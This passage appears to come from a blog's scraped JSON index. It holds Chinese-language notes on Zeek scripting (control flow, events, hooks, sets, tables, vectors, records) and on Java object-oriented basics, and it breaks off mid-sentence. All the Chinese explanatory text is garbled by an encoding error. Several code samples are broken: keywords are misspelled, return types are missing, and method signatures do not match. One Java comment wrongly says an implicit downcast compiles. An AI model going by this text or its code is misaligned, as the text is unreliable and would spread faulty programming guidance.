&#123; print &quot;Found it!&quot;; print fmt(&quot;And by &#39;it&#39;, I mean %s.&quot;, x); &#125; else &#123; print &quot;I&#39;m looking for&quot;, x, &quot;not&quot;, c; &#125; &#125; &#125; è¾“å‡ºï¼š 1234567I&#39;m looking for, 3, not, 1I&#39;m looking for, 3, not, 2Found it.And by &#39;it&#39;, I mean 3.I&#39;m looking for, 3, not, 4I&#39;m looking for, 3, not, 5 Zeekçš„ifè¯­å¥å’Œå…¶ä»–è¯­è¨€ç±»ä¼¼ï¼Œæœ‰if...else...è¯­å¥å—ï¼Œä¹Ÿæœ‰if...else if...else...è¯­å¥å—ã€‚ è¿™é‡Œç”¨åˆ°äº†fmt()å‡½æ•°ç”¨äºæ ¼å¼åŒ–è¾“å‡ºï¼Œè¯­æ³•ä¸Pythonç±»ä¼¼ã€‚å®ƒä¹Ÿå¯ä»¥ä½¿ç”¨,è¿æ¥å­—ç¬¦ä¸²å’Œå˜é‡ä¹‹é—´ã€‚ foreachè¯­å¥ è§ifè¯­å¥ç« èŠ‚ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé™¤äº†vectorç±»å‹å¤–ï¼Œå…¶ä»–çš„æ‰€æœ‰collectionç±»å‹çš„æ•°æ®ç±»å‹éƒ½ä¸èƒ½ä¿è¯å¾ªç¯çš„é¡ºåºã€‚ If the order is important the collection should be a vector. Whileè¯­å¥ 12345678910111213141516171819202122event bro_init() &#123; local i &#x3D; 0; while (i &lt; 5) print ++i; while (i % 2 !&#x3D; 0) &#123; local finish_up &#x3D; F; if (finish_up &#x3D;&#x3D; F) print &quot;nope&quot;; ++i; next; if (finish_up) break; &#125; print i; &#125; è¿™é‡Œçš„breakå’Œnextç±»ä¼¼ä¸å…¶ä»–è¯­è¨€ä¸­çš„breakå’Œcontinueã€‚ å¦å¤–ï¼Œä¸Šé¢è¿™æ®µä»£ç æ˜¯å®˜æ–¹ç»™çš„ç¤ºä¾‹ï¼ŒZeekè¯­æ³•çš„ç¼©è¿›åæ­£æˆ‘æœ€å…ˆçœ‹æ˜¯çœ‹çš„æ˜¯ä¸€æ„£ä¸€æ„£çš„ï¼Œåæ¥æ‰å‘ç°Zeekæ˜¯æ—¢æ”¯æŒç¼©è¿›ï¼Œä¹Ÿæ”¯æŒ&#123;&#125;ï¼Œè¿™ä¸¤ç§éƒ½è®¤ã€‚ ç»ƒä¹ ä¸€ ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œä»æ‚¨é€‰æ‹©çš„ä»»æ„å­—ç¬¦ä¸²ä¸­åˆ é™¤æ‰€æœ‰çš„å­—æ¯â€œeâ€ï¼ˆå¯ä»¥ä¸å°±åœ°å¤„ç†ï¼‰ã€‚ ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œæ‰“å°ä»1åˆ°100ï¼Œå¦‚æœæ˜¯3çš„å€æ•°ï¼Œæ‰“å°â€œFizzâ€ï¼›å¦‚æœæ˜¯5çš„å€æ•°ï¼Œæ‰“å°â€œBuzzâ€ã€‚å¦‚æœæ—¢æ˜¯3çš„å€æ•°ä¹Ÿæ˜¯5çš„å€æ•°æ‰“å°FizzBuzzã€‚ 12345678910111213141516171819202122232425262728293031323334353637event bro_init() &#123; local result &#x3D; &quot;&quot;; for (c in &quot;testing&quot;) &#123; if (c !&#x3D; &quot;e&quot;) &#123; result +&#x3D; c; &#125; &#125; print result; &#125;# ä½¿ç”¨é€’å½’function fizzbuzz(i: count) &#123; local s &#x3D; &quot;&quot;; if (i % 3 &#x3D;&#x3D; 0) s +&#x3D; &quot;Fizz&quot;; if (i % 5 &#x3D;&#x3D; 0) s +&#x3D; &quot;Buzz&quot;; if (s &#x3D;&#x3D; &quot;&quot;) print i; else print s; if (i &lt; 100) fizzbuzz(i + 1); &#125; event bro_done() &#123; fizzbuzz(1); &#125; Switchè¡¨è¾¾å¼ 123456789101112131415161718192021222324event bro_init() &#123; local x &#x3D; 4; switch (x) &#123; case 0: print &quot;case 0&quot;; break; case 1, 2, 3: print &quot;case 1, 2, 3&quot;; break; case 4: print &quot;case 4 and ...&quot;; fallthrouth; case 5: # This block may execute if x is 4 or 5. print &quot;case 5&quot;; default: print &quot;default case&quot;; break; &#125; &#125; fallthrouthå…³é”®å­—ä¼šè®©ç¨‹åºå¿½ç•¥é™åˆ¶æ¡ä»¶è€Œæ¥ç€æ‰§è¡Œä¸‹ä¸€ä¸ªcaseã€‚ ç»ƒä¹ ï¼š ä½¿ç”¨Switchè¯­å¥ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œè®¡ç®—ä»»æ„å­—ç¬¦ä¸²ä¸­çš„å…ƒéŸ³ï¼ˆaï¼Œeï¼Œiï¼Œoï¼Œuï¼‰çš„æ•°é‡ã€‚ 12345678910111213141516event bro_init() &#123; local result &#x3D; 0; local input &#x3D; &quot;The Zeek Network Security Monitor&quot;; for (c in input) &#123; switch (c) &#123; case &quot;a&quot;, &quot;e&quot;, &quot;i&quot;, &quot;o&quot;, &quot;u&quot;: ++result; break; &#125; &#125; print result; &#125; äº‹ä»¶ Eventç®—æ˜¯Zeeké‡Œé¢æ¯”è¾ƒæ ¸å¿ƒçš„æ¦‚å¿µï¼Œå¯ä»¥ç®—æ˜¯ä¸€ç§ç‰¹æ®Šå½¢å¼çš„å‡½æ•°ï¼Œä½†ä¸å‡½æ•°åˆä¸åŒçš„æ˜¯ï¼š äº‹ä»¶å¹¶ä¸æƒ³å‡½æ•°ä¸€æ ·ä¼šç«‹åˆ»æ‰§è¡Œï¼Œå®ƒä»¬å¯èƒ½ä¼šåœ¨ä»¥åçš„æ—¶é—´è¿›è¡Œè°ƒåº¦å’Œæ‰§è¡Œï¼Œå› æ­¤å®ƒä»¬çš„æ•ˆæœåœ¨è°ƒç”¨ä¹‹åå¯èƒ½æ— æ³•ç›´æ¥å®ç°ï¼› å®ƒä»¬æ²¡æœ‰è¿”å›å€¼ï¼Œå› ä¸ºå®ƒä»¬æ²¡æœ‰è¢«ç›´æ¥è°ƒç”¨è€Œæ˜¯è¢«å®‰æ’åœ¨ä»¥åæ‰§è¡Œï¼› å¯ä»¥ä¸ºåŒä¸€äº‹ä»¶å®šä¹‰å¤šä¸ªä¸»ä½“ï¼Œæ¯ä¸ªä¸»ä½“éƒ½è¢«è§†ä¸ºâ€œäº‹ä»¶å¤„ç†ç¨‹åºâ€ã€‚ å½“éœ€è¦æ‰§è¡Œä¸€ä¸ªäº‹ä»¶æ—¶ï¼Œè¯¥äº‹ä»¶çš„æ‰€æœ‰å¤„ç†ç¨‹åºä¸»ä½“å‡æŒ‰ä¼˜å…ˆçº§é¡ºåºæ‰§è¡Œã€‚ 1234567891011121314151617181920212223242526272829303132global myevent: event(s: string);global n &#x3D; 1;event myevent(s: string) &amp;priority &#x3D; -10 &#123; n &#x3D; n + 2; &#125; event myevent(s: string) &amp;priority &#x3D; 5 &#123; --n; &#125;event myevent(s: string) &amp;priority &#x3D; 10 &#123; print &quot;myevent&quot;, s, n; &#125;event bro_init() &#123; print &quot;bro_init()&quot;; event myevent(&quot;hi&quot;); event myevent(&quot;wait&quot;); schedule 5 sec &#123; myevent(&quot;bye&quot;) &#125;; &#125;event bro_done() &#123; print &quot;bro_done()&quot;; &#125; è¾“å‡ºï¼š 123456bro_init()myevent, hi, 1myevent, wait, 2myevent, bye, 3bro_done() æˆ‘æŠŠå®˜æ–¹çš„ä¾‹å­ä¿®æ”¹äº†ä¸€ç‚¹ï¼Œæ„Ÿè§‰è¿™æ ·æ›´èƒ½ä½“ç°Eventçš„ç‰¹ç‚¹ã€‚ åœ¨bro_init()ä¸­æ¯æ‰§è¡Œä¸€æ¬¡my_eventéƒ½ä¼šæŠŠè¯¥äº‹ä»¶çš„ä¸‰ä¸ªä¸»ä½“æŒ‰ç…§@priorityçš„é¡ºåºåˆ†åˆ«æ‰§è¡Œä¸€æ¬¡ã€‚å…¶ä¸­å‰ä¸¤æ¬¡ä¼šä»¥è¿…é€Ÿæ‰§è¡Œmy_eventï¼Œè€Œç¬¬ä¸‰æ¬¡ä¼š5såæˆ–è€…Zeekæ‰§è¡Œç»“æŸä¹‹å‰æ‰§è¡Œã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼š å¦‚æœæ²¡æœ‰æ˜¾ç¤ºæŒ‡å®šï¼Œ@priorityå‚æ•°ä¼šé»˜è®¤ä¸º0ï¼› å¦‚æœ@priorityéƒ½ç›¸ç­‰ï¼Œåˆ™æŒ‰é¡ºåºæ‰§è¡Œã€‚ Hook Hookæ˜¯å¦å¤–ä¸€ç§å½¢å¼çš„å‡½æ•°ï¼Œä¸Eventç±»ä¼¼ï¼Œä½†æ˜¯åˆæœ‰ä¸¤ç‚¹ä¸å¤ªä¸€æ ·ï¼š å®ƒè¢«è°ƒç”¨æ—¶ä¼šç«‹åˆ»æ‰§è¡Œï¼› å¦‚æœæ‰§è¡Œåˆ°ä¸»ä½“çš„æœ«å°¾æˆ–è¿”å›è¯­å¥ï¼Œåˆ™å°†æ‰§è¡ŒHookå¤„ç†ç¨‹åºã€‚ ä½†æ˜¯ï¼Œå¦‚æœHookçš„ä¸»ä½“ä»¥breakè¯­å¥ç»ˆæ­¢ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œå…¶ä½™çš„Hookå¤„ç†ç¨‹åºã€‚ 12345678910111213141516171819202122232425262728global myhook: hook(s: string)hook myhook(s: string) @priority &#x3D; 10 &#123; print &quot;priority 10 myhook handler&quot;, s; s &#x3D; &quot;bye&quot;; &#125; hook myhook(s: string) &#123; print &quot;break out of myhook handling&quot;, s; break; &#125; hook myhook(s: string) &amp;priority &#x3D; -5 &#123; print &quot;not going to happen&quot;, s; &#125; event bro_init() &#123; local ret:bool &#x3D; hook myhook(&quot;hi&quot;); if ( ret ) &#123; print &quot;all handlers ran&quot;; &#125; &#125; 123priority 10 myhook handler, hibreak out of myhook handling, hi Composite-types: Set é›†åˆ setï¼šé›†åˆç±»å‹ï¼Œå…¶ä¸­å…ƒç´ å”¯ä¸€ï¼Œå¯ä»¥ä½¿ç”¨addå’Œdeleteå‡½æ•°å¯¹å…ƒç´ è¿›è¡Œå¢åˆ æ“ä½œï¼Œä»¥åŠinæ“ä½œç¬¦åˆ¤æ–­æ˜¯å¦å­˜åœ¨ã€‚ 123456789101112131415event bro_init() &#123; local x: set[string] &#x3D; &#123;&quot;one&quot;, &quot;two&quot;, &quot;three&quot;&#125;; add x[&quot;four&quot;]; print &quot;four&quot; in x; delete x[&quot;two&quot;]; print &quot;two&quot; !&#x3D; x; add x[&quot;one&quot;]; for (e in x) &#123; print e; &#125; &#125; è¾“å‡ºï¼š 123456TTfourthreeone Composite-types: Table æ˜ å°„ Zeekä¸­çš„tableç±»å‹ç±»ä¼¼äºdictæˆ–Mapï¼Œç´¢å¼•æ˜¯å”¯ä¸€çš„ï¼Œå¯ä»¥ä½¿ç”¨deleteè¿›è¡Œåˆ é™¤æ“ä½œï¼Œå¯ä»¥ç›´æ¥èµ‹å€¼æ“ä½œæ¥æ–°å¢å…ƒç´ ã€‚ 1234567891011121314151617event bro_init() &#123; local x: table[count] of string &#x3D; &#123; [1] &#x3D; &quot;one&quot;, [3] &#x3D; &quot;three&quot;, [5] &#x3D; &quot;five&quot;&#125;; x[7] &#x3D; &quot;seven&quot;; print 7 in x; delete x[3]; print 3 !&#x3D; x; x[1] &#x3D; &quot;1&quot;; # changed the value at index 1 for (key in x) &#123; print key; &#125; &#125; è¾“å‡ºï¼š 1234567TsevenT175 éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œtableæ•°æ®ç±»å‹å®šä¹‰çš„æ–¹æ³•table [count] of stringã€‚ Composite-types: Vector å‘é‡ Vectorç±»ä¼¼äºarraryæˆ–listï¼Œå…è®¸æœ‰é‡å¤çš„å…ƒç´ ã€‚ 123456789101112131415event bro_init() &#123; local x: vector of string &#x3D; &#123;&quot;one&quot;, &quot;two&quot;, &quot;three&quot;&#125;; print x; print x[1]; print |x|; x[|x|] &#x3D; &quot;one&quot;; print x; for (i in x) &#123; print i; &#125; &#125; è¾“å‡ºï¼š 123456789[one, two, three]two3[one, two, three, one]0123 vector of stringæŒ‡æ˜vectorä¸­å…ƒç´ ç±»å‹ã€‚ Composite-types: Record è®°å½• Recordè®°å½•ç±»å‹ï¼Œç±»ä¼¼äºCè¯­è¨€ä¸­çš„ç»“æ„ä½“ã€‚ 1234567891011121314151617181920type MyRecord: record &#123; a: string; b: count; c: bool &amp;default &#x3D; T; d: int &amp;optional;&#125;;event bro_init() &#123; local x &#x3D; MyRecord($a &#x3D; &quot;vvvvvv&quot;, $b &#x3D; 6, $c &#x3D; F, $d &#x3D; -13); if (x?$d) print x$d; &#125; print x; x &#x3D; MyRecord($a &#x3D; &quot;abc&quot;, $b &#x3D; 3); print x; print x$c; print x?$d; è¾“å‡ºï¼š 123456-13[a&#x3D;vvvvvv, b&#x3D;6, c&#x3D;F, d&#x3D;-13][a&#x3D;abc, b&#x3D;3, c&#x3D;T, d&#x3D;&lt;uninitialized&gt;]TF $æ“ä½œç¬¦é€šå¸¸ç±»ä¼¼äº.æ“ä½œç¬¦ï¼Œx?$dç”¨äºåˆ¤æ–­xä¸­æ˜¯å¦å­˜åœ¨å­—æ®µdã€‚ Zeekç‰¹æœ‰çš„æ•°æ®ç±»å‹ timeï¼šæ—¶é—´æˆ³ intervalï¼šæ—¶é—´ç›¸å¯¹å•ä½ï¼ŒåŒ…æ‹¬usec, msec, sec, min, hr, å’Œday portï¼šç«¯å£ addrï¼šIPåœ°å€ subnetï¼šå­ç½‘","tags":[{"name":"Bro","slug":"Bro","permalink":"http://ca0y1h.top/tags/Bro/"}],"categories":[{"name":"æµé‡åˆ†æ","slug":"æµé‡åˆ†æ","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"Bro","slug":"æµé‡åˆ†æ/Bro","permalink":"http://ca0y1h.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/Bro/"}]},{"title":"JavaåŸºç¡€å­¦ä¹ ä¹‹é¢å‘å¯¹è±¡åŸºç¡€","date":"2019-09-23T13:14:53.000Z","path":"Java/code/3.JavaåŸºç¡€å­¦ä¹ ä¹‹é¢å‘å¯¹è±¡åŸºç¡€/","text":"JavaåŸºç¡€å­¦ä¹ ä¹‹é¢å‘å¯¹è±¡åŸºç¡€ æ–¹æ³• å¯å˜å‚æ•° å¯å˜å‚æ•°ç”¨ç±»å‹...å®šä¹‰ï¼Œå¯å˜å‚æ•°ç›¸å½“äºæ•°ç»„ç±»å‹ï¼š 1234567class Group &#123; private String[] name; public void setNames(String... names)&#123; this.names = names &#125;&#125; å‚æ•°ç»‘å®š Javaä¸­çš„å‚æ•°ç»‘å®šå…¶å®ä¹Ÿå°±æ˜¯ä¼ å€¼ä¼ é€’å’Œä¼ å€ä¼ é€’ã€‚ æˆ‘ä»¬å…ˆè§‚å¯Ÿä¸€ä¸ªåŸºæœ¬ç±»å‹å‚æ•°çš„ä¼ é€’ï¼š 12345678910111213141516171819202122public class Main &#123; public static void main(String[] args) &#123; Person p = new Person(); int n = 15; // nçš„å€¼ä¸º15 p.setAge(n); // ä¼ å…¥nçš„å€¼ System.out.println(p.getAge()); // 15 n = 20; // nçš„å€¼æ”¹ä¸º20 System.out.println(p.getAge()); // 15 &#125;&#125;class Person &#123; private int age; public int getAge() &#123; return this.age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125; ä»ç»“æœå¯çŸ¥ï¼Œä¿®æ”¹å¤–éƒ¨çš„å±€éƒ¨å˜é‡nï¼Œä¸å½±å“å®ä¾‹pçš„ageå­—æ®µï¼ŒåŸå› æ˜¯setAge()æ–¹æ³•è·å¾—çš„å‚æ•°ï¼Œå¤åˆ¶äº†nçš„å€¼ï¼Œå› æ­¤ï¼Œp.ageå’Œå±€éƒ¨å˜é‡näº’ä¸å½±å“ã€‚ ç»“è®ºï¼šåŸºæœ¬ç±»å‹å‚æ•°çš„ä¼ é€’ï¼Œæ˜¯è°ƒç”¨æ–¹å€¼çš„å¤åˆ¶ã€‚åŒæ–¹å„è‡ªçš„åç»­ä¿®æ”¹ï¼Œäº’ä¸å½±å“ã€‚ æˆ‘ä»¬å†çœ‹ä¸€ä¸ªä¼ é€’å¼•ç”¨å‚æ•°çš„ä¾‹å­ï¼š 12345678910111213141516171819202122public class Main &#123; public static void main(String[] args) &#123; Person p = new Person(); String[] fullname = new String[] &#123; &quot;Homer&quot;, &quot;Simpson&quot; &#125;; p.setName(fullname); // ä¼ å…¥fullnameæ•°ç»„ System.out.println(p.getName()); // &quot;Homer Simpson&quot; fullname[0] = &quot;Bart&quot;; // fullnameæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¿®æ”¹ä¸º&quot;Bart&quot; System.out.println(p.getName()); // &quot;Bart Simpson&quot;? &#125;&#125;class Person &#123; private String[] name; public String getName() &#123; return this.name[0] + &quot; &quot; + this.name[1]; &#125; public void setName(String[] name) &#123; this.name = name; &#125;&#125; æ³¨æ„åˆ°setName()çš„å‚æ•°ç°åœ¨æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚ä¸€å¼€å§‹ï¼ŒæŠŠfullnameæ•°ç»„ä¼ è¿›å»ï¼Œç„¶åï¼Œä¿®æ”¹fullnameæ•°ç»„çš„å†…å®¹ï¼Œç»“æœå‘ç°ï¼Œå®ä¾‹pçš„å­—æ®µp.nameä¹Ÿè¢«ä¿®æ”¹äº†ï¼ ç»“è®ºï¼šå¼•ç”¨ç±»å‹å‚æ•°çš„ä¼ é€’ï¼Œè°ƒç”¨æ–¹çš„å˜é‡ï¼Œå’Œæ¥æ”¶æ–¹çš„å‚æ•°å˜é‡ï¼ŒæŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡ã€‚åŒæ–¹ä»»æ„ä¸€æ–¹å¯¹è¿™ä¸ªå¯¹è±¡çš„ä¿®æ”¹ï¼Œéƒ½ä¼šå½±å“å¯¹æ–¹ å†æ¥çœ‹ä¸€ä¸ªå¼•ç”¨ç±»å‹çš„å‚æ•°ç»‘å®šï¼š 12345678910111213141516171819202122public class Main &#123; public static void main(String[] args) &#123; Person p = new Person(); String bob = &quot;Bob&quot;; p.setName(bob); // ä¼ å…¥bobå˜é‡ System.out.println(p.getName()); // &quot;Bob&quot; bob = &quot;Alice&quot;; // bobæ”¹åä¸ºAlice System.out.println(p.getName()); // æ³¨æ„ï¼šè¿˜æ˜¯&quot;Bob&quot; &#125;&#125;class Person &#123; private String name; public String getName() &#123; return this.name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125; String[] fullnameä¼ é€’ç»™p.nameçš„æ˜¯å †ä¸­çš„åœ°å€ï¼Œå…±åŒæ“ä½œå †ä¸­çš„å†…å®¹ã€‚bobä¼ é€’ç»™p.nameä»¥åä¸¤è€…å‡æŒ‡å‘å¸¸é‡æ± çš„Bobï¼ŒåbobæŒ‡å‘äº†å¸¸é‡æ± ä¸­çš„Aliceï¼Œä½†æ˜¯p.nameä»ç„¶æŒ‡å‘Bobï¼Œå†ä¸€æ¬¡ p.setName(bob);çš„è¯p.nameå°†æŒ‡å‘Aliceã€‚ æ„é€ æ–¹æ³• é»˜è®¤æ„é€ æ–¹æ³• åœ¨Javaä¸­ï¼Œåˆ›å»ºå¯¹è±¡å®ä¾‹çš„æ—¶å€™ï¼ŒæŒ‰ç…§å¦‚ä¸‹é¡ºåºè¿›è¡Œåˆå§‹åŒ–ï¼š å…ˆåˆå§‹åŒ–å­—æ®µï¼Œä¾‹å¦‚ï¼Œint age = 10;è¡¨ç¤ºå­—æ®µåˆå§‹åŒ–ä¸º10ï¼Œdouble salary;è¡¨ç¤ºå­—æ®µé»˜è®¤åˆå§‹åŒ–ä¸º0ï¼ŒString name;è¡¨ç¤ºå¼•ç”¨ç±»å‹å­—æ®µé»˜è®¤åˆå§‹åŒ–ä¸ºnullï¼› æ‰§è¡Œæ„é€ æ–¹æ³•çš„ä»£ç è¿›è¡Œåˆå§‹åŒ–ã€‚ å¤šæ„é€ æ–¹æ³• å¯ä»¥å®šä¹‰å¤šä¸ªæ„é€ æ–¹æ³•ï¼Œåœ¨é€šè¿‡newæ“ä½œç¬¦è°ƒç”¨çš„æ—¶å€™ï¼Œç¼–è¯‘å™¨é€šè¿‡æ„é€ æ–¹æ³•çš„å‚æ•°æ•°é‡ã€ä½ç½®å’Œç±»å‹è‡ªåŠ¨åŒºåˆ†ï¼š 123456789101112131415class Person &#123; private String name; private int age; public Person(String name, int age)&#123; this.name = name; this.age = age; &#125; public Person(String name)&#123; this.name = name; &#125; public Person()&#123; &#125;&#125; å¦‚æœè°ƒç”¨new Person(&quot;Xiao Ming&quot;, 20);ï¼Œä¼šè‡ªåŠ¨åŒ¹é…åˆ°æ„é€ æ–¹æ³•public Person(String, int)ã€‚ å¦‚æœè°ƒç”¨new Person(&quot;Xiao Ming&quot;);ï¼Œä¼šè‡ªåŠ¨åŒ¹é…åˆ°æ„é€ æ–¹æ³•public Person(String)ã€‚ å¦‚æœè°ƒç”¨new Person();ï¼Œä¼šè‡ªåŠ¨åŒ¹é…åˆ°æ„é€ æ–¹æ³•public Person()ã€‚ ä¸€ä¸ªæ„é€ æ–¹æ³•å¯ä»¥è°ƒç”¨å…¶ä»–æ„é€ æ–¹æ³•ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯ä¾¿äºä»£ç å¤ç”¨ã€‚è°ƒç”¨å…¶ä»–æ„é€ æ–¹æ³•çš„è¯­æ³•æ˜¯this(â€¦)ï¼š 1234567891011121314151617class Person()&#123; private String name; private int age; public Person(String name, int age)&#123; this.name = name; this.age = age; &#125; public Person(String name)&#123; //è°ƒç”¨Person(String, int)æ„é€ æ–¹æ³• this(name, 18); &#125; public Person()&#123; this(&#x27;Unnamed&#x27;) //è°ƒç”¨Person(String)æ„é€ æ–¹æ³• &#125;&#125; æ–¹æ³•é‡è½½ åœ¨ä¸€ä¸ªç±»ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰å¤šä¸ªæ–¹æ³•ã€‚å¦‚æœæœ‰ä¸€ç³»åˆ—æ–¹æ³•ï¼Œå®ƒä»¬çš„åŠŸèƒ½éƒ½æ˜¯ç±»ä¼¼çš„ï¼Œåªæœ‰å‚æ•°æœ‰æ‰€ä¸åŒï¼Œé‚£ä¹ˆï¼Œå¯ä»¥æŠŠè¿™ä¸€ç»„æ–¹æ³•ååšæˆåŒåæ–¹æ³•ã€‚è¿™ç§æ–¹æ³•åç›¸åŒï¼Œä½†å„è‡ªçš„å‚æ•°ä¸åŒï¼Œç§°ä¸ºæ–¹æ³•é‡è½½ï¼ˆOverloadï¼‰ã€‚ æ³¨æ„ï¼šæ–¹æ³•é‡è½½çš„è¿”å›å€¼ç±»å‹é€šå¸¸éƒ½æ˜¯ç›¸åŒçš„ã€‚ ç»§æ‰¿ protectedå…è®¸å­ç±»è®¿é—®çˆ¶ç±»çš„å­—æ®µå’Œæ–¹æ³•ã€‚ 1234567891011121314151617181920212223public class Main&#123; public void main(String[] args)&#123; Student s = new Student(&quot;Xiao Ming&quot;, 18); &#125;&#125;class Person&#123; protected String name; protected int age; public Person(String name, int age)&#123; this.name = name; this.age = age; &#125;&#125;class Student extends Person&#123; protected int score; public Student(String name, int age, int score)&#123; this.score = score; &#125;&#125; è¿è¡Œä¸Šé¢çš„ä»£ç ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªç¼–è¯‘é”™è¯¯ï¼Œå¤§æ„æ˜¯åœ¨Studentçš„æ„é€ æ–¹æ³•ä¸­ï¼Œæ— æ³•è°ƒç”¨Personçš„æ„é€ æ–¹æ³•ã€‚è¿™æ˜¯å› ä¸ºåœ¨Javaä¸­ï¼Œä»»ä½•classçš„æ„é€ æ–¹æ³•ï¼Œç¬¬ä¸€è¡Œè¯­å¥å¿…é¡»æ˜¯è°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•ã€‚å¦‚æœæ²¡æœ‰æ˜ç¡®åœ°è°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œç¼–è¯‘å™¨ä¼šå¸®æˆ‘ä»¬è‡ªåŠ¨åŠ ä¸€å¥super(); ä½†æ˜¯ï¼ŒPersonç±»å¹¶æ²¡æœ‰æ— å‚æ•°çš„æ„é€ æ–¹æ³•ï¼Œå› æ­¤ï¼Œç¼–è¯‘å¤±è´¥ã€‚è§£å†³æ–¹æ³•æ˜¯è°ƒç”¨Personç±»å­˜åœ¨çš„æŸä¸ªæ„é€ æ–¹æ³•ã€‚ä¾‹å¦‚ï¼š 12345678class Student extends Person&#123; protected int score; public Student(String name, int age, int score)&#123; super(name, age); this.score = score; &#125;&#125; ç»“è®ºï¼š å¦‚æœçˆ¶ç±»æ²¡æœ‰é»˜è®¤çš„æ„é€ æ–¹æ³•ï¼Œå­ç±»å°±å¿…é¡»æ˜¾å¼è°ƒç”¨super()å¹¶ç»™å‡ºå‚æ•°ä»¥ä¾¿è®©ç¼–è¯‘å™¨å®šä½åˆ°çˆ¶ç±»çš„ä¸€ä¸ªåˆé€‚çš„æ„é€ æ–¹æ³•ã€‚ å­ç±»ä¸ä¼šç»§æ‰¿ä»»ä½•çˆ¶ç±»çš„æ„é€ æ–¹æ³•ã€‚å­ç±»é»˜è®¤çš„æ„é€ æ–¹æ³•æ˜¯ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œä¸æ˜¯ç»§æ‰¿çš„ã€‚ Javaå…è®¸å‘ä¸Šè½¬å‹ï¼Œä¸å…è®¸å‘ä¸‹è½¬å‹ï¼š 12345Person p1 = new Student(); //upcasting okPerson p2 = new Preson();Student s1 = p1; // okStudent s2 = p2 //error å¤šæ€ å®šä¹‰ï¼šå¤šæ€æ˜¯æŒ‡ï¼Œé’ˆå¯¹æŸä¸ªç±»å‹çš„æ–¹æ³•è°ƒç”¨ï¼Œå…¶çœŸæ­£æ‰§è¡Œçš„æ–¹æ³•å–å†³äºè¿è¡Œæ—¶æœŸå®é™…ç±»å‹çš„æ–¹æ³•ã€‚ ä¸¾ä¸ªä¾‹å­ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657public class Main()&#123; public void main(String[] args)&#123; // ç»™ä¸€ä¸ªæœ‰æ™®é€šæ”¶å…¥ã€å·¥èµ„æ”¶å…¥å’Œäº«å—å›½åŠ¡é™¢ç‰¹æ®Šæ´¥è´´çš„å°ä¼™ä¼´ç®—ç¨: Income[] incomes = new Income[] &#123; new Income(3000), new Salary(5000), new StateCouncilSpecialAllowance(15000) &#125;, System.out.println(totalTax(incomes)); &#125; public static double totalTax(Income[] incomes)&#123; double total = 0; for(Income income: incomes)&#123; total += income.getTax(); &#125; return total; &#125;&#125;class Income&#123; protected double income; public Income(double income)&#123; this.income = income; &#125; public double getTax(double income)&#123; return income * 0.1; &#125;&#125;class Salary extends Income&#123; public Salary(double income)&#123; this.income = income; &#125; @Override public getTax(double income)&#123; if (income &lt;= 5000)&#123; return 0; &#125; return (income - 5000) * 0.2; &#125;&#125;class StateCouncilSpecialAllowance extends Income&#123; public StateCouncilSpecialAllowance(double income)&#123; this.income = income; &#125; @Override public getTax(double income)&#123; return 0; &#125;&#125; ç»§æ‰¿å¯ä»¥å…è®¸å­ç±»è¦†å†™çˆ¶ç±»çš„æ–¹æ³•ã€‚å¦‚æœä¸€ä¸ªçˆ¶ç±»ä¸å…è®¸å­ç±»å¯¹å®ƒçš„æŸä¸ªæ–¹æ³•è¿›è¡Œè¦†å†™ï¼Œå¯ä»¥æŠŠè¯¥æ–¹æ³•æ ‡è®°ä¸ºfinalï¼›å¦‚æœä¸€ä¸ªç±»ä¸å¸Œæœ›ä»»ä½•å…¶ä»–ç±»ç»§æ‰¿è‡ªå®ƒï¼Œé‚£ä¹ˆå¯ä»¥æŠŠè¿™ä¸ªç±»æœ¬èº«æ ‡è®°ä¸ºfinalï¼›å¯¹äºä¸€ä¸ªç±»çš„å®ä¾‹å­—æ®µï¼ŒåŒæ ·å¯ä»¥ç”¨finalä¿®é¥°ã€‚ç”¨finalä¿®é¥°çš„å­—æ®µåœ¨åˆå§‹åŒ–åä¸èƒ½è¢«ä¿®æ”¹ã€‚ æŠ½è±¡ç±» å¦‚æœçˆ¶ç±»çš„æ–¹æ³•æœ¬èº«ä¸éœ€è¦å®ç°ä»»ä½•åŠŸèƒ½ï¼Œä»…ä»…æ˜¯ä¸ºäº†å®šä¹‰æ–¹æ³•ç­¾åï¼Œç›®çš„æ˜¯è®©å­ç±»å»è¦†å†™å®ƒï¼Œé‚£ä¹ˆï¼Œå¯ä»¥æŠŠçˆ¶ç±»çš„æ–¹æ³•å£°æ˜ä¸ºæŠ½è±¡æ–¹æ³•ï¼š 1234class Person &#123; public abstract void run();&#125; å¿…é¡»æŠŠPersonç±»æœ¬èº«ä¹Ÿå£°æ˜ä¸ºabstractï¼Œæ‰èƒ½æ­£ç¡®ç¼–è¯‘å®ƒï¼š 1234abstract class Person &#123; public abstract void run();&#125; æ— æ³•å®ä¾‹åŒ–çš„æŠ½è±¡ç±»æœ‰ä»€ä¹ˆç”¨ï¼Ÿ å› ä¸ºæŠ½è±¡ç±»æœ¬èº«è¢«è®¾è®¡æˆåªèƒ½ç”¨äºè¢«ç»§æ‰¿ï¼Œå› æ­¤ï¼ŒæŠ½è±¡ç±»å¯ä»¥å¼ºè¿«å­ç±»å®ç°å…¶å®šä¹‰çš„æŠ½è±¡æ–¹æ³•ï¼Œå¦åˆ™ç¼–è¯‘ä¼šæŠ¥é”™ã€‚å› 